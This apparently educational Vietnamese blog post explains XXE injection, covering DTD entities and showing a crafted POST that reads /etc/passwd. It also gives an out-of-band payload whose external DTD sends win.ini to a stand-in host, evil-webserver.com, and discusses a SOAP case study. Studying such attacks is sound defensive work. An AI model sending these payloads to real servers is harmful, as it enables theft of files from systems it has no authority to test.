---
layout: post
title: Đi sâu vào phân tích lỗi XXE - Một bài viết hay,
date: 2021-10-23 00:32:20 +0700
description: Đi sâu vào phân tích lỗi XXE - Một bài viết hay
img: 2021/10/23/xxe_keyfeatures.png
fig-caption: # Add figcaption (optional)
tags: [Security, WebSecurity]
---


XXE Injection luôn nằm trong danh sách Top 10 của OWASP trong một vài năm. XXE Injection không chỉ giới hạn cho các Web application; bất cứ nơi nào có XML Parser (web, host, software), là ứng cử tiềm năng cho XXE tồn tại.

Bài viết này chúng ta sẽ cùng nhau đi phân tích cách thức hoạt động của XXE, một số cách khai thác lỗ hổng XXE và đề cập đến hai cuộc tấn công XXE thực lấy nguồn từ SRT.

## 1.XML và các ENTITYs của nó

Điểm hay ho nhất về XXE là nó là chức năng hoàn toàn hợp lệ của ngôn ngữ XML. Không có "black magic" với cuộc tấn công này, chỉ đơn giản là một tính năng bị lạm dụng thường xuyên được bật theo mặc định. Tính năng này là external entity.

Để hiểu ENTITY, trước tiên chúng ta phải xem qua về các file Document Type Definition(DTD). File DTD là một loại tệp XML đặc biệt chứa thông tin về định dạng hoặc cấu trúc của XML. Chúng được sử dụng để thiết lập tính nhất quán giữa các XML files khác nhau. Các tệp DTD này có thể chứa một phần tử được gọi là ENTITY. Xem bên dưới để biết ví dụ về tệp .dtd:

```
<!DOCTYPE STRUCTURE [
<!ELEMENT SPECIFICATIONS (#PCDATA)>
<!ENTITY VERSION “1.1”>
<!ENTITY file SYSTEM “file:///c:/server_files/application.conf” >
]>
```

Chúng ta sẽ không phân tích rõ ràng về cú pháp của tệp .dtd, chỉ cần hiểu rằng bất kỳ XML nào tham chiếu đến tệp .dtd này sẽ cần tuân theo cấu trúc của nó (source).

Các thẻ ENTITY bên trong chỉ đơn giản là một shortcut đến một ký tự đặc biệt có thể được tham chiếu bởi XML file đang gọi (source). Lưu ý rằng ENTITY tag cuối cùng đang thực sự kéo nội dung của một tệp cục bộ, thông qua từ khóa SYSTEM.

Tệp .dtd ở trên có thể được sử dụng như sau:

```
<?xml version=”1.0″ encoding=”UTF-8″?>
<!DOCTYPE foo SYSTEM “http://validserver.com/formatting.dtd”>
<specifications>&file;</specifications>
```

formatting.dtd được gọi bằng cách sử dụng DOCTYPE tag và  XML file có thể tham chiếu các ENTITY và cấu trúc bên trong.

ENTITY có thể được sử dụng mà không cần hình thức của một tệp .dtd đầy đủ. Bằng cách gọi DOCTYPE và sử dụng dấu ngoặc vuông [], bạn có thể tham chiếu các ENTITY tag để chỉ sử dụng trong tệp XML đó. Dưới đây, tệp application.conf được tham chiếu để sử dụng trong các tags```<configuration> </configuration>```, không có tệp .dtd đầy đủ để lưu trữ nó:

```
<?xml version=”1.0″ encoding=”ISO-8859-1″?>
<!DOCTYPE example [
<!ELEMENT example ANY >
<!ENTITY file SYSTEM “file:///c:/server_files/application.conf” >
]>
<configuration>&file;</configuration>
```
Tóm lại:

* Các tệp DTD có thể là bên ngoài hoặc bên trong tệp XML
* ENTITY tồn tại trong tệp DTD
* ENTITY có thể gọi các tệp hệ thống cục bộ

## 2. Injection Fun

Khi dữ liệu được chuyển đến máy chủ trong một Yêu cầu HTTP, nó sẽ mở ra khả năng bị lạm dụng từ phía người dùng. Các nhà phát triển web đang đặt niềm tin của họ vào máy khách sẽ không sửa đổi mã hoặc (giải pháp tốt hơn) đang đưa ra các biện pháp kiểm soát để ngăn chặn các sửa đổi độc hại hoạt động. Bất kể ý định của nhà phát triển web là gì, lỗi vẫn xảy ra và việc inject vẫn hay thường được thực thi thành công trên máy chủ. Đây là một ví dụ, trong đó dữ liệu từ một biểu mẫu được gói trong XML và được gửi đến máy chủ để được xử lý. Kẻ tấn công sẽ:

* Chặn yêu cầu POST dễ bị tấn công bằng proxy web (Burpsuite, Zap, v.v.)
* Thêm thẻ injection ENTITY tag và &xxe; variable reference. Đảm bảo & xxe; variable reference là dữ liệu sẽ được trả về và hiển thị
* Giải phóng yêu cầu POST bị chặn

Điều này sẽ dẫn đến yêu cầu POST được tạo thủ công sau (injected content in red):

```
POST /notes/savenote HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml;charset=UTF-8
Host: myserver.com

<?xml version=”1.0″ ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM “file:///etc/passwd” >]>
<note>
<to>Alice</to>
<from>Bob</from>
<header>Sync Meeting</header>
<time>1200</time>
<body>Meeting time changed &xxe;</body>
</note>ss
```

Tại máy chủ, giả sử dữ liệu hợp lệ đã được nhập vào biểu mẫu, parse XML data được gửi lên này trước khi lưu nó vào backend và trả về dữ liệu đã parse với dữ liệu hợp lệ ban đầu. Trong trường hợp này, nội dung của ```/etc/passwd``` được hiển thị.

```
HTTP/1.1 200 OK
Content-Type: text/xml;charset=UTF-8
Server: Microsoft-IIS/7.5
Date: Sat, 19 Apr 2019 13:08:49 GMT
Connection: close
Content-Length: 1039

Note saved! From Bob to Alice about “Sync Meeting” at 1200: Meeting time has changed
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
..snip…
```

## 3. Sneaking Out of Band

Bình thường ta sẽ khi nhìn thấy XXE rõ ràng như thế này, nhưng có trường hợp XML được chuyển đến máy chủ không được hiển thị / trả lại theo cách thuận lợi như vậy. Trong trường hợp thế này XML vẫn có thể được inject, nhưng không được trả lại cho máy khách trong phản hồi HTTP, chúng ta chuyển sang các tệp .dtd bên ngoài đó đã được đề cập trước đó. Tham chiếu DOCTYPE đến các tệp .dtd bên ngoài cho phép chúng ta thực hiện cuộc tấn công này hoàn toàn out of band.

Chúng ta sẽ sửa đổi ví dụ trước để mô tả điều này. Chúng tôi cũng sẽ giả định đây là một máy chủ Windows. Trong ví dụ trước, một tham chiếu ENTITY file đã được lưu vào biến xxe, biến này được tham chiếu trong form. Trong ví dụ này, tham chiếu ENTITY dành cho máy chủ bên ngoài https://evil-webserver.com:

```
POST /notes/savenote HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: text/xml;charset=UTF-8.
Host: myserver.com

<?xml version=”1.0″ ?>
<!DOCTYPE hack [
<!ELEMENT x ANY >
<!ENTITY % alpha SYSTEM “https://evil-webserver.com/payload.dtd”>
%alpha;
%bravo;
]>
<x>&charlie;</x>
<note>
<to>Alice</to>
<from>Bob</from>
<header>Sync Meeting</header>
<time>1200</time>
<body>Meeting time changed</body>
</note>
```

Payload.dtd bên ngoài chứa những thứ sau:

```
<?xml version=”1.0″ encoding=”utf-8″ ?>
<!ENTITY % data SYSTEM “file:///c:/windows/win.ini”>
<!ENTITY % bravo “<!ENTITY % charlie SYSTEM
‘https://evil-webserver.com/?%data;’>”>
```

Hãy lưu ý rằng ```file:///c:/windows/win.ini``` được chứa trong tệp .dtd, chứ không phải trong mã XXE được đưa vào. Đây là một động thái lén lút cho phép chúng ta ẩn tệp nào chúng ta đang cố gắng trích xuất từ nhật ký truy cập máy chủ.

![xxe-out-of-band]({{site.url}}/assets/img/2021/10/23/xxe-out-of-band.png){:width="600px"}

* Client gửi yêu cầu POST với mã XML inject code
* Máy chủ, thông qua XML parser, phân tích cú pháp XML từ trên xuống dưới, đạt đến injected ENTITY
* Máy chủ yêu cầu payload.dtd từ https://evil-webserver.com
* https://evil-webserver.com phản hồi bằng payload.dtd
* Mã bên trong payload.dtd được parse bởi XML parser, XML parser sẽ đọc nội dung của win.ini và gửi nó dưới dạng tham số trong một yêu cầu HTTP GET trở lại https://evil-webserver.com

Kẻ tấn công có thể xem dữ liệu trích xuất này trong nhật ký máy chủ web của chúng.

## 4. Pass the SOAP

Lấy ví dụ, một tình huống thực tế từ SRC Team. Một thành viên SRT đã tìm thấy một dịch vụ web cung cấp nhiều phương thức API SOAP. SOAP (Simple Object Access Protocol) là một cấu trúc giao tiếp cho phép nhiều applications/elements khác nhau giao tiếp với nhau. Quan trọng hơn nó cũng có cấu trúc như XML, khiến nó có thể dễ bị tấn công bởi XXE.

Trong trường hợp này, các phương thức API khác nhau có các phần ```<XMLData>``` có thể chứa các ENTITY tags được chèn vào. Vì vậy, việc đưa ra yêu cầu POST request /ConductOrders.asmx endpoint có thể sẽ tạo ra một yêu cầu đến máy chủ web của kẻ tấn công:

![xxe-sc1]({{site.url}}/assets/img/2021/10/23/XXE-Blog-SC01.png){:width="600px"}

Kết quả là máy chủ sẽ tìm nạp nội dung của external dtd

![xxe-sc2]({{site.url}}/assets/img/2021/10/23/XXE-Blog-SC02.png){:width="600px"}


Mã XML này sẽ hướng dẫn XML Parser gửi nội dung của tệp c:\windows\win.ini trong yêu cầu đến máy chủ của kẻ tấn công, bằng cách thêm biến charlie vào cuối yêu cầu, làm cho nó có thể xem được trong nhật ký máy chủ của kẻ tấn công:

![xxe-sc3]({{site.url}}/assets/img/2021/10/23/XXE-Blog-SC03.png){:width="600px"}

Và cứ như vậy, bất kỳ tệp cục bộ nào mà máy chủ web có thể đọc được đều là của anh ta để đánh cắp. 

Lưu ý: Permission là quan trọng trong cuộc tấn công này. Nếu máy chủ web (hoặc người dùng www-data) không có quyền, nó sẽ không trả lại nội dung file. Đây là lý do tại sao chúng ta load ```/etc/passwd``` thay vì ```/etc/shadow``` trong các Proof of Concept (PoC) này.  


## Tham khảo

+ SRT Blog: https://www.synack.com/blog/a-deep-dive-into-xxe-injection/
